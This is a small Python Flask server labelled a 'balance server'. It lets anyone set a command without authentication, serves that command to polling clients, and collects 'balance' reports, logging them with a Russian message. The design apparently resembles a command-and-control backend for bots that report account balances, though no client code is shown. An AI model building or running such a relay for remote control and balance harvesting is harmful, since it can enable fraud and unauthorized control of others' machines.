from flask import Flask, request, jsonify
import os

app = Flask(__name__)

current_command = None
balances = []

@app.route("/")
def home():
    return "Balance server working"

@app.route("/set_command", methods=["GET", "POST"])
def set_command():
    global current_command

    if request.method == "POST":
        data = request.json or {}
        current_command = data.get("command")
    else:
        current_command = request.args.get("command")

    return jsonify({"status": "command set", "command": current_command})

@app.route("/get_command")
def get_command():
    global current_command
    return jsonify({"command": current_command})

@app.route("/send_balance", methods=["POST"])
def send_balance():
    data = request.json or {}
    balances.append(data)
    print("Получен баланс:", data)
    return jsonify({"status": "ok"})

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 10000))
    app.run(host="0.0.0.0", port=port)
